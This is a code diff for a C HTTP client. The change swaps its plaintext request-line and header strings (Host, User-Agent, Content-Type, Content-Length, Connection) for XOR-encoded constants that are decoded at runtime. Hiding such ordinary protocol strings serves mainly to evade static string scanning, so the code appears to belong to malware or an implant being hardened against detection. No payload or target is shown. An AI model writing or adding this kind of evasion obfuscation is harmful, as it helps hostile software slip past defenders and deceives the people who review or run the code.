@@ -132,7 +132,9 @@ static const char *strcasestr_simple(const char *haystack, const char *needle) {
 }
 
 static int parse_content_length(const char *headers) {
-    const char *cl = strcasestr_simple(headers, "content-length:");
+    char cl_label[ENC_LX_CONTENT_LENGTH_LEN + 1];
+    xor_dec(cl_label, ENC_LX_CONTENT_LENGTH, ENC_LX_CONTENT_LENGTH_LEN);
+    const char *cl = strcasestr_simple(headers, cl_label);
     if (!cl) return -1;
     cl += 15;
     while (*cl == ' ') cl++;
@@ -165,27 +167,29 @@ int http_request(const char *method, const char *path,
     char ct[64];
     xor_dec(ct, ENC_CONTENT_TYPE, ENC_CONTENT_TYPE_LEN);
 
+    char fmt_req[ENC_LX_HTTP_REQ_LINE_LEN + 1];
+    xor_dec(fmt_req, ENC_LX_HTTP_REQ_LINE, ENC_LX_HTTP_REQ_LINE_LEN);
+    char fmt_host[ENC_LX_HOST_HDR_LEN + 1];
+    xor_dec(fmt_host, ENC_LX_HOST_HDR, ENC_LX_HOST_HDR_LEN);
+    char fmt_ua[ENC_LX_UA_HDR_LEN + 1];
+    xor_dec(fmt_ua, ENC_LX_UA_HDR, ENC_LX_UA_HDR_LEN);
+    char fmt_ct[ENC_LX_CT_HDR_LEN + 1];
+    xor_dec(fmt_ct, ENC_LX_CT_HDR, ENC_LX_CT_HDR_LEN);
+    char fmt_cl[ENC_LX_CL_HDR_LEN + 1];
+    xor_dec(fmt_cl, ENC_LX_CL_HDR, ENC_LX_CL_HDR_LEN);
+    char conn_close[ENC_LX_CONN_CLOSE_LEN + 1];
+    xor_dec(conn_close, ENC_LX_CONN_CLOSE, ENC_LX_CONN_CLOSE_LEN);
+
     char hdr[1024];
-    int hdr_len;
+    int hdr_len = 0;
+    hdr_len += snprintf(hdr + hdr_len, sizeof(hdr) - hdr_len, fmt_req, method, path);
+    hdr_len += snprintf(hdr + hdr_len, sizeof(hdr) - hdr_len, fmt_host, host, port_str);
+    hdr_len += snprintf(hdr + hdr_len, sizeof(hdr) - hdr_len, fmt_ua, ua);
     if (body && body_len > 0) {
-        hdr_len = snprintf(hdr, sizeof(hdr),
-            "%s %s HTTP/1.1\r\n"
-            "Host: %s:%s\r\n"
-            "User-Agent: %s\r\n"
-            "Content-Type: %s\r\n"
-            "Content-Length: %zu\r\n"
-            "Connection: close\r\n"
-            "\r\n",
-            method, path, host, port_str, ua, ct, body_len);
-    } else {
-        hdr_len = snprintf(hdr, sizeof(hdr),
-            "%s %s HTTP/1.1\r\n"
-            "Host: %s:%s\r\n"
-            "User-Agent: %s\r\n"
-            "Connection: close\r\n"
-            "\r\n",
-            method, path, host, port_str, ua);
+        hdr_len += snprintf(hdr + hdr_len, sizeof(hdr) - hdr_len, fmt_ct, ct);
+        hdr_len += snprintf(hdr + hdr_len, sizeof(hdr) - hdr_len, fmt_cl, body_len);
     }
+    hdr_len += snprintf(hdr + hdr_len, sizeof(hdr) - hdr_len, "%s\r\n", conn_close);
 
     int result = -1;
 
